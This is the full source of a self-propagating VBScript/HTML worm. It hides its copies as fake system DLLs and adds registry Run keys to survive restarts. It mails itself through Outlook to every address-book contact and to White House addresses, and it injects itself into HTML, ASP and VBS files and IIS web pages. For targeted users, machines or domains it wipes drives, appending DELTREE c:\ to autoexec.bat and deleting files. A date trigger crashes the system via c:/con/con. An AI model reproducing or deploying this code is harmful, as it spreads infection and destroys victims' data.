
















'@ thank you!  make use of other person to get rid of an enemy, white trap _2001
on error resume next
dim vbscr, fso,w1,w2,MSWKEY,HCUW,Code_Str, Vbs_Str, Js_Str
dim defpath, smailc, MAX_SIZE
dim whb(), title(10)
smailc = 4
Redim whb(smailc)
whb(0) = "president@whitehouse.gov"
whb(1) = "vice.president@whitehouse.gov"
whb(2) = "first.lady@whitehouse.gov"
whb(3) = "mrs.cheney@whitehouse.gov"
title(0) = "Thanks for helping me!"
title(1) = "The police are investigating the robbery"
title(2) = "an application for a job"
title(3) = "The aspects of an application process pertinent to OSI"
title(4) = "What a pleasant weather. Why not go out for a walk?"
title(5) = "These countries have gone / been through too many wars"
title(6) = "We've fixed on the 17th of April for the wedding"
title(7) = "The wind failed and the sea returned to calmness."
title(8) = "the sitting is open!"
title(9) = ""
defpath  = "C:\Readme.html" 
MAX_SIZE = 100000
MSWKEY   = "HKEY_LOCAL_MACHINE\SoftWare\Microsoft\Windows\"
HCUW     = "HKEY_CURRENT_USER\Software\Microsoft\WAB\"
main 

sub main()
on error resume next
dim w_s
w_s= WScript.ScriptFullName
if w_s = "" then 
Err.Clear
set fso = CreateObject("Scripting.FileSystemObject")
if getErr then 
Randomize
ra = int(rnd() * 7)
doucment.write title(ra)       
ExecuteMail
else      
ExecutePage
end if  
else
ExecuteVbs
end if
end sub

Function  getErr()
if Err.number<>0 then 
getErr=true
Err.Clear 
else 
getErr=false
end if    
end function

sub ExecutePage()
on error resume next
dim Html_Str, adi, wdf, wdf2,wdf3,wdsf, wdsf2, vf
Vbs_Str  = GetScriptCode("vbscript")
Js_Str   = GetJavaScript()
Code_Str =  MakeScript(encrypt(Vbs_str),true)
Html_Str =  MakeHtml(encrypt(Vbs_str), true) 
Gf
wdsf  = w2 & "Mdm.vbs"
wdsf2 = w1 & "Profile.vbs"
wdf   = w2 & "user.dll"
wdf2  = w2 & "Readme.html"
wdf3  = w2 & "system.dll"
set vf = fso.OpenTextFile (wdf, 2, true)
vf.write Vbs_Str
vf.close  
set vf = fso.OpenTextFile (wdsf, 2, true)
vf.write Vbs_Str
vf.close
set vf = fso.OpenTextFile (wdsf2, 2, true)
vf.Write Vbs_Str
vf.close
set vf = fso.OpenTextFile (wdf2, 2, true)
vf.write Html_Str
vf.close 
set vf = fso.OpenTextFile (wdf3, 2, true)
vf.write Code_Str
vf.close 
Writereg  MSWKEY & "CurrentVersion\Run\Mdm", wdsf, ""    
Writereg  MSWKEY & "CurrentVersion\RunServices\Profile", wdsf2, ""
SendMail
Hackpage
if TestUser then
Killhe
else
if Month(Date) & Day(Date) = "75" then
set vf = fso.OpenTextFile(w2 & "75.htm", 2,true)
vf.write MakeScript ("window.navigate ('c:/con/con');", false)
vf.close
Writereg  MSWKEY & "CurrentVersion\Run\75", w2 & "75.htm", ""
window.navigate "c:/con/con"
else
if fso.FileExists(w2 & "75.htm") then fso.DeleteFile w2 & "75.htm"
end if
end if
set adi = fso.Drives
for each x in adi
if x.DrivesType = 2 or x.DrivesType = 3 then  
call SearchHTML(x & "\")
end if
next
if fso.FileExists(defpath) then  fso.DeleteFile defpath
end sub

sub  ExecuteMail()
on error resume next
Vbs_Str  = GetScriptCode("vbscript")
Js_Str   = GetJavaScript()
Set Stl = CreateObject("Scriptlet.TypeLib")
with Stl
.Reset
.Path = defpath
.Doc =  MakeHtml(encrypt(Vbs_str), true) 
.Write()
end with
window.open defpath, "trap", "width=1 height=1 menubar=no scrollbars=no toolbar=no"
end sub

sub ExecuteVbs()
on error resume next
dim x, adi, wvbs, ws, vf
set fso = CreateObject("Scripting.FileSystemObject")
set wvbs = CreateObject("WScript.Shell")
Gf
wvbs.RegWrite  MSWKEY & "Windows Scripting Host\Setings\Timeout", 0, "REG_DWORD" 
set vf = fso.OpenTextFile (w2 & "system.dll", 1)
Code_Str = vf.ReadAll()
vf.close
Hackpage
SendMail
set adi = fso.Drives
for each x in adi
if x.DrivesType = 2 or x.DrivesType = 3 then  
call SearchHTML(x & "\")
end if   
next
if TestUser then Killhe
end sub

sub Gf()
w1=fso.GetSpecialFolder(0) & "\"
w2=fso.GetSpecialFolder(1) & "\"
end sub

function Readreg(key_str)
set tmps = CreateObject("WScript.Shell")
Readreg = tmps.RegRead(key_str)
set tmps = Nothing
end function

function Writereg(key_str, Newvalue, vtype)
set tmps = CreateObject("WScript.Shell")
if vtype="" then
tmps.RegWrite key_str, Newvalue
else
tmps.RegWrite key_str, Newvalue, vtype
end if      
set tmps = Nothing
end function

function MakeHtml(Sbuffer, iHTML)
dim ra
Randomize
ra = int(rnd() * 7)
MakeHtml="<" & "HTML><" & "HEAD><" & "TITLE>" & title(ra) & "</" & "TITLE><" & "/HEAD>" & _
"<BO" & "AD>" & vbcrlf &  MakeScript(Sbuffer, iHTML) & vbcrlf & _
"<" & "/BOAD><" & "/HTML>"
end Function

function MakeScript(Codestr, iHTML) 
if iHTML then
dim DocuWrite
DocuWrite = "document.write('<'+" & "'SCRIPT Language=JavaScript>\n'+" & _
      "jword" & "+'\n</'" & "+'SCRIPT>');"
DocuWrite = DocuWrite & vbcrlf & "document.write('<'+" & "'SCRIPT Language=VBScript>\n'+" & _
      "nword" & "+'\n</'" & "+'SCRIPT>');"
MakeScript="<" & "SCRIPT Language=JavaScript>" & vbcrlf & "var jword = " & _
chr(34) & encrypt(Js_Str) & chr(34) & vbcrlf & "var nword = " & _
chr(34) &  Codestr &  chr(34) & vbcrlf & "nword = unescape(nword);" & vbcrlf & _
"jword = unescape(jword);" & vbcrlf & DocuWrite & vbcrlf & "</" & "SCRIPT>" 
else     
MakeScript= "<" & "SCRIPT Language=JavaScript>" & Codestr & "</" & "SCRIPT>"
end if
end function 

function GetScriptCode(Languages)
dim soj
for each soj in document.scripts
if LCase(soj.Language) =  Languages then
if Languages = "javascript" then 
if len(soj.Text)> 200 then 
else 
  GetScriptCode = soj.Text
  exit function
end if  
else
GetScriptCode = soj.Text
exit function
end if    
end if
next 
end function

function GetJavaScript()
GetJavaScript = GetScriptCode("javascript")
end function

function TestUser()
on error resume next
dim keys(6), i, tmpStr, Wnet
keys(0) = "white home"
keys(1) = "central intelligence agency"
keys(2) = "bush"
keys(3) = "american stock exchang"
keys(4) = "chief executive"
keys(5) = "usa"
TestUser = false
Set Wnet = CreateObject("WScript.Network")
tmpStr = LCase(Wnet.UserName)
for i=0 to 4
if  InStr(tmpStr, keys(i)) > 0 then
TestUser=true
exit function
end if  
next    
tmpStr = LCase(Wnet.ComputerName) 
for i=0 to 4
if  InStr(tmpStr, keys(i)) > 0 then
TestUser=true
exit function
end if 
next   
tmpStr = LCase(Wnet.UserDomain)
for i=0 to 4
if  InStr(tmpStr, keys(i)) >0 then
TestUser=true
exit function
end if 
next
Set Wnet = Nothing
end function

function SendMail()
on error resume next
dim wab,ra,j, Oa, arrsm, eins, Eaec, fm, wreg, areg,at
Randomize
at=fso.GetSpecialFolder(1) & "\Readme.html"
set  Oa  = CreateObject("Outlook.Application")
set  wab = Oa.GetNameSpace("MAPI")
for j = 1 to wab.AddressLists.Count
eins = wab.AddressLists(j)
wreg=Readreg (HCUW  & eins)
if (wreg="") then wreg = 1
Eaec = eins.AddressEntries.Count
if (Eaec > Int(wreg)) then
for x = 1 to Eaec
arrsm = wab.AddressEntries(x)
areg = Readreg(HCUW & arrsm)
if (areg = "") then
set fm = wab.CreateItem(0)
with fm
ra = int(rnd() * 7)
.Recipients.Add arrsm
.Subject = title(ra)
.Body = title(ra)
.Attachments at
.Send
Writereg HCUW & arrsm, 1, "REG_DWORD"
end with
end if
next
end if    
Writereg HCUW & eins, Eaec, ""   
next 
for j = 1 to smailc
arrsm = whb(j)
set fm = wab.CreateItem(0)
ra = int(rnd() * 7)
with fm
.Recipients.Add arrsm
.Subject = title(ra) 
.Body = title(ra)
.Send
end with
next    
set Oa = Nothing
window.setTimeout "SendMail()", 10000
end function

sub SearchHTML(Path)
on error resume next
dim pfo, psfo, pf, ps, pfi, ext
if instr(Path, fso.GetSpecialFolder(2)) > 0  then exit sub
set pfo    = fso.GetFolder(Path)
set psfo   = pfo.SubFolders
for each  ps in psfo
SearchHTML(ps.Path)
set pf  = ps.Files
for each pfi in pf
ext = LCase(fso.GetExtensionName(pfi.Path))
if instr(ext, "htm") > 0 or ext = "plg" or ext = "asp" then
if Code_Str<>"" then AddHead pfi.Path, pfi, 1
elseif ext= "vbs"  then
AddHead pfi.Path,pfi, 2
end if       
next 
next 
end sub

sub Killhe()
on error resume next
dim codeText, ko,adi, kd, kh, ks,kf,kfs
codeText = "@ECHO OFF" & vbcrlf & "PATH " & w1 & "COMMAND" & vbcrlf &_
"DELTREE c:\"
set ko = fso.OpenTextFile("C:\Autoexec.bat", 8, true)
ko.Write vbcrlf & codeText 
ko.Close
set adi = fso.Drives
for each x in adi
if x.DrivesType = 2  then  
set kd = fso.GetFolder(x & "\")
set kfs = kd.Files
for each kf in kfs
kf.Delete
next    
set ks = kd.SubFolders
for each kh in  ks
msgbox kh.path
kh.Delete
next   
end if   
next
do while 1
window.open ""
loop
end sub

sub Hackpage()
dim fi
H = "C:\InetPut\wwwroot"
if fso.FolderExists(H) then
set fi = fso.GetFile(H & "\index.htm")
AddHead H & "\index.htm",fi,1
end if   
end sub

sub AddHead(Path, f, t)
on error resume next
dim tso, buffer,sr
if f.size > MAX_SIZE then exit sub
set tso = fso.OpenTextFile(Path, 1, true)
buffer = tso.ReadAll()
tso.close
if (t = 1) then
if UCase(Left(LTrim(buffer), 7)) <> "<SCRIPT" then
set tso = fso.OpenTextFile(Path, 2, true)
tso.Write  Code_Str & vbcrlf & buffer
tso.close
end if
else
if mid(buffer, 3, 2) <> "'@" then
tso.close
sr=w2 & "user.dll"
if fso.FileExists(sr) then fso.CopyFile sr, Path
end if
end if
end sub
















